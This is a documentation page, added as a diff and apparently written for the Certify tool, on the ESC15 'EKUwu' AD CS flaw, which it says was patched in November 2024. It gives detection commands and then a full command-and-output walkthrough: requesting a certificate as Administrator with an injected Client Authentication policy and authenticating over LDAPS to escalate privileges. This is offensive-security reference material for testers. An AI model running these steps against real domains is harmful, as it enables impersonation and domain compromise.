@@ -1,0 +1,144 @@
+---
+title: 'ESC15 - EKUwu (Application Policy Injection)'
+description: 'Exploit schema version 1 certificate templates to inject arbitrary application policies and bypass EKU restrictions'
+icon: 'code-commit'
+sidebarTitle: 'ESC15'
+---
+
+ESC15 is a vulnerability disclosed by [Justin Bollinger](https://www.linkedin.com/in/jcbollinger) in [this blogpost](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc), which details an insecurity in the way Active Directory Certificate Services (AD CS) handles application policy extensions in certificate requests for certificate templates with schema version 1.
+
+<Warning>
+According to the MSRC security guidance for [CVE-2024-49019 (EKUwu)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019), the vulnerability has been **patched** in November 2024.
+</Warning>
+
+## Vulnerability Details
+
+In unpatched environments, if a certificate template has schema version 1 and allows the requester to supply arbitrary subject details, it is possible to include a custom application policy extension with the certificate request and have it embedded into the issued certificate.
+
+This allows an attacker to inject arbitrary application policies into certificate requests for templates whose Extended Key Usages (EKUs) does not contain a desired value, potentially allowing for the following attacks:
+
+<Accordion title="Potential Attack Scenarios">
+- **Inject the `Client Authentication` (`1.3.6.1.5.5.7.3.2`) application policy** and carry out an [ESC1](./esc1-misconfigured-client-authentication) attack.
+- **Inject the `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`) application policy** and carry out an [ESC3](./esc3-misconfigured-certificate-request-agent) attack.
+</Accordion>
+
+## Detection
+
+We can search for certificate templates with these conditions using the `enum-templates --filter-vulnerable` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-vulnerable --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Enabled certificate templates found using the current filter parameters:
+
+    CA Name                               : ca01.corp.local\CORP-CA01-CA
+    Template Name                         : WebServer
++   Schema Version                        : 1
+    Validity Period                       : 2 years
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
+    Enrollment Flag                       : NONE
+    Manager Approval Required             : False
+    Authorized Signatures Required        : 0
++   Extended Key Usage                    : Server Authentication
++   Certificate Application Policies      : <null>
+    Vulnerabilities
+      ESC15                               : The template has schema version 1 and allows enrollees to supply subject.
+    Permissions
+      Enrollment Permissions
++       Enrollment Rights           : NT AUTHORITY\Authenticated Users   S-1-5-11
+      Object Control Permissions
+
+Certify completed in 00:00:00.6124414
+```
+</CodeGroup>
+
+## Exploitation
+
+Once we have identified a vulnerable ESC15 certificate template that our attacker-controlled user has enrollment rights for, we can request a certificate based on the template, and include a Subject Alternative Name (SAN) for a target user that we want to impersonate (e.g. `Administrator`) as well as the application policy we want to inject (e.g. `Client Authentication`).
+
+This can be done using the `request` command from Certify. The SAN can be in either of the formats `UserPrincipalName` (`--upn`), `DnsName` (`--dns`), or `Rfc822Name` (`--email`). For environments where *Strong Certificate Mapping* is enabled, the security identifier (SID) of the target user must also be supplied with the `--sid` parameter.
+
+<CodeGroup>
+```bash Request Certificate with Injected Policy
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template WebServer --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500 --application-policy 1.3.6.1.5.5.7.3.2
+```
+
+```bash Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate
+
+[*] Current user context    : CORP\lowpriv
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : WebServer
+[*] Subject                 : CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+[*] Subject Alt Name(s)     : Administrator
+[*] Sid Extension           : S-1-5-21-976219687-1556195986-4104514715-500
+[*] Application Policies    : 1.3.6.1.5.5.7.3.2
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 1
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:03.6579609
+```
+</CodeGroup>
+
+<Warning>
+Unfortunately, we cannot use the issued certificate to authenticate over Kerberos PKINIT with [Rubeus](/ghostpack-docs/Rubeus-mdx/overview), as the protocol evaluates only the `Extended Key Usage` extension of an authentication certificate. However, the LDAP Schannel protocol also evaluates the `Application Policy` extension of an authentication certificate, so we can authenticate to LDAPS using [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/).
+</Warning>
+
+First, we write the issued certificate to a file (`cert.pfx`).
+
+<CodeGroup>
+```powershell Save Certificate
+[IO.File]::WriteAllBytes("cert.pfx", [Convert]::FromBase64String("MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh..."))
+```
+</CodeGroup>
+
+Then, we can authenticate over LDAP Schannel with `PassTheCert` and confirm that we have successfully elevated our privileges by impersonating the `Administrator` user.
+
+<CodeGroup>
+```bash Authenticate via LDAP Schannel
+PassTheCert.exe --server dc01.corp.local --cert-path cert.pfx --whoami
+```
+
+```bash Output
+Querying LDAP As : u:CORP\Administrator
+```
+</CodeGroup>
